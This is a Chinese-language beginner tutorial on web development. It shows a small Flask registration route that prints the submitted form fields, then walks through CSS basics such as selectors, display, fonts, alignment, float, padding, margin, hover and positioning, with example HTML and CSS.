<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/doreg&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">doreg</span>():</span><br><span class="line">    user = request.form.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    pwd = request.form.get(<span class="string">&quot;pwd&quot;</span>)</span><br><span class="line">    gender = request.form.getlist(<span class="string">&quot;gender&quot;</span>)</span><br><span class="line">    hobby_list = request.form.getlist(<span class="string">&quot;hobby&quot;</span>)</span><br><span class="line">    city = request.form.get(<span class="string">&quot;city&quot;</span>)</span><br><span class="line">    skill_list = request.form.get(<span class="string">&quot;skill&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;user: &quot;</span>, user)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;pwd: &quot;</span>, pwd)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;gender: &quot;</span>, gender)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;city: &quot;</span>, city)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;skill_list: &quot;</span>, skill_list)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;register OK&quot;</span></span><br></pre></td></tr></table></figure>

<p>测试，浏览器中访问注册页面 https:&#x2F;&#x2F;{server_ip}&#x2F;register 填写注册信息:<br><img data-src="/2024/0827223326/image1.png"></p>
<p>提交注册表单后，在flask日志中查看表单参数:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ImmutableMultiDict([(&#x27;user&#x27;, &#x27;peter&#x27;), (&#x27;pwd&#x27;, &#x27;123456&#x27;), (&#x27;gender&#x27;, &#x27;1&#x27;), (&#x27;hobby&#x27;, &#x27;1&#x27;), (&#x27;hobby&#x27;, &#x27;2&#x27;), (&#x27;city&#x27;, &#x27;bj&#x27;), (&#x27;skill&#x27;, &#x27;1&#x27;), (&#x27;skill&#x27;, &#x27;2&#x27;)])</span><br><span class="line">user:  peter</span><br><span class="line">pwd:  123456</span><br><span class="line">gender:  [&#x27;1&#x27;]</span><br><span class="line">city:  bj</span><br><span class="line">skill_list:  1</span><br></pre></td></tr></table></figure>

<h1><span id="css">CSS</span></h1><p>用来”美化”标签</p>
<h2><span id="css应用方式">CSS应用方式</span></h2><ol>
<li><p>在head标签中添加style标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.c1</span>&#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">color</span>:red;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">	</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>写到CSS文件里<br>以Flask App为例，在static目录下创建test.css</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.c1</span>&#123;</span><br><span class="line">	<span class="attribute">color</span>:red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.c2</span>&#123;</span><br><span class="line">	<span class="attribute">color</span>:blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>templates目录下创建test.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/test.css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span>红标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;c2&quot;</span>&gt;</span>蓝标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>web.py下新增路由</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;test.html&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2><span id="css选择器">CSS选择器</span></h2><p>分类: ID选择器、类选择器、标签选择器、属性选择器、后代选择器</p>
<h3><span id="类选择器-最常用">类选择器 (最常用)</span></h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.cl</span>&#123;</span><br><span class="line">	<span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="id选择器">ID选择器</span></h3><p>用的少, 因为id不能重复，只能修改一个标签的样式</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#c2</span>&#123;</span><br><span class="line">	<span class="attribute">color</span>: green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="标签选择器">标签选择器</span></h3><p>为所有li标签定义样式</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">li</span>&#123;</span><br><span class="line">	<span class="attribute">color</span>: blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="属性选择器">属性选择器</span></h3><p>在input标签中选择type&#x3D;’text’的标签</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&#x27;text&#x27;</span>]</span>&#123;</span><br><span class="line">	<span class="attribute">border</span>: <span class="number">2px</span> solid pink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在class为v1的标签中选择属性a&#x3D;1的标签</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.v1</span><span class="selector-attr">[a=<span class="string">&quot;1&quot;</span>]</span>&#123;</span><br><span class="line">	<span class="attribute">color</span>: gold;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="后代选择器">后代选择器</span></h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.xx</span> <span class="selector-tag">li</span>&#123;</span><br><span class="line">	<span class="attribute">color</span>: gold;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>CSS选择器例子</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.c1</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#c2</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: green;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: blue;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;text&quot;</span>]</span>&#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">border</span>: <span class="number">2px</span> solid pink;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.v1</span><span class="selector-attr">[a=<span class="string">&quot;1&quot;</span>]</span>&#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.xx</span> <span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">color</span>: gold;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 类选择器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span>标题1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- ID选择器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;c2&quot;</span>&gt;</span>标题2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 标签选择器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>移动<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>联通<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 属性选择器--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;v1&quot;</span> <span class="attr">a</span>=<span class="string">&quot;0&quot;</span>&gt;</span>V0<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;v1&quot;</span> <span class="attr">a</span>=<span class="string">&quot;1&quot;</span>&gt;</span>V1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 后代选择器 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;xx&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>页面效果<br><img data-src="/2024/0827223326/image2.png"></p>
<h2><span id="样式">样式</span></h2><h3><span id="高度和宽度">高度和宽度</span></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">	<span class="selector-class">.c1</span>&#123;</span></span><br><span class="line"><span class="language-css">		<span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">		<span class="attribute">width</span>: <span class="number">50%</span></span></span><br><span class="line"><span class="language-css">	&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>宽度支持百分比</li>
<li>对于行内标签, 设置高度和宽度默认无效</li>
<li>对于块级标签默认有效, 但右侧空白区域不能被其他标签利用</li>
</ul>
<h3><span id="displayinline-block">display:inline-block</span></h3><p>display:inline-block使标签同时具备块级和行内的特点</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.c1</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3><span id="displayblock-displayinline">display:block, display:inline</span></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;display: inline;&quot;</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;display: block;&quot;</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>display:block 可以把标签转为块级标签</li>
<li>display:inline 可以把标签转为内联标签</li>
</ul>
<p>Google浏览器 按F12 -&gt; Elements -&gt; 查看两个标签的宽和高，确认修改生效</p>
<h3><span id="字体">字体</span></h3><p>查HTML颜色代码网站： <a href="https://htmlcolorcodes.com/">HTML Color Codes</a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">	<span class="selector-class">.c1</span> &#123;</span></span><br><span class="line"><span class="language-css">		<span class="attribute">color</span>: <span class="number">#00FE7F</span>; <span class="comment">/* 颜色 */</span></span></span><br><span class="line"><span class="language-css">		<span class="attribute">font-size</span>: <span class="number">44px</span>; <span class="comment">/* 字体大小 */</span></span></span><br><span class="line"><span class="language-css">		<span class="attribute">font-weight</span>: <span class="number">500</span>; <span class="comment">/* 加粗 */</span></span></span><br><span class="line"><span class="language-css">		<span class="attribute">font-family</span>: Microsoft Yahei; <span class="comment">/* 字体 */</span></span></span><br><span class="line"><span class="language-css">	&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>color指定颜色</li>
<li>font-size指定字体大小</li>
<li>font-weight指定加粗</li>
<li>font-family指定字体</li>
</ul>
<h3><span id="文字对齐方式">文字对齐方式</span></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.cl</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">height</span>: <span class="number">60px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">border</span>: <span class="number">1px</span> solid red;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">text-align</span>: center; <span class="comment">/* 水平居中 */</span></span></span><br><span class="line"><span class="language-css">			<span class="attribute">line-height</span>: <span class="number">59px</span>; <span class="comment">/* 垂直居中 */</span></span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">	</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>text-align: center 表示水平方向居中</li>
<li>垂直方向居中用line-height1</li>
</ul>
<h3><span id="float">float</span></h3><p>例1: 两个span标签, 分别显示在左边和右边, 应用样式 float: right</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">span</span>&gt;</span>左<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;float: right&quot;</span>&gt;</span>右<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>效果:<br><img data-src="/2024/0827223326/image_css1.png"></p>
<p>例2: 对于块级标签(如div), 应用float样式, 可以让多个块级标签显示在同一行</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.c1</span>&#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">width</span>: <span class="number">150px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">border</span>: <span class="number">1px</span> solid red;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">	</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 三个div标签会显示在同一行 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="内边距padding">内边距(padding)</span></h3><p>例：给div标签设置左边距, 右边距为10px, 上边距和下边距为20px</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.c1</span>&#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">width</span>: <span class="number">120px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">padding-left</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">padding-right</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">padding-top</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">padding-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="comment">/* padding: 20px 10px 20px 10px; 上 右 下 左 */</span></span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">	</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background-color: yellow&quot;</span>&gt;</span>文本1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background-color: blue&quot;</span>&gt;</span>文本2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="外边距margin-top">外边距(margin-top)</span></h3><p>例: 定义两个div标签, 让第二个div的上边框距离第一个div 20px</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.c1</span>&#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">border</span>: <span class="number">1px</span> solid blue;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">margin-top</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">	</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;height: 200px; border: 1px solid red;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="hover">hover</span></h3><p>hover选择器用于选择鼠标指针浮动在上面的元素</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.c1</span>&#123;</span><br><span class="line">	<span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.c1</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">	<span class="attribute">color</span>: green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="position">position</span></h3><ul>
<li>fixed</li>
<li>relative</li>
<li>absolute</li>
</ul>
<p>fixed<br>固定在窗口的某个位置</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.back</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: fixed;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">bottom</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>relative和absolute</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.c1</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">500px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">right</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">bottom</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.c2</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">59px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">59px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: <span class="number">#00FF7F</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">right</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">bottom</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>效果：<br><img data-src="/2024/0827223326/css_image2.png"></p>
<h3><span id="边框border">边框(border)</span></h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">border</span>: <span class="number">3px</span> solid red; <span class="comment">/* 3px边框 实线 红色 */</span></span><br><span class="line"><span class="comment">/* border-left: 3px solid transparent; */</span> <span class="comment">/* 先加个透明色边框 */</span></span><br></pre></td></tr></table></figure>

<h3><span id="背景色backgroud-color">背景色(backgroud-color)</span></h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">background-color</span>: red;</span><br></pre></td></tr></table></figure>

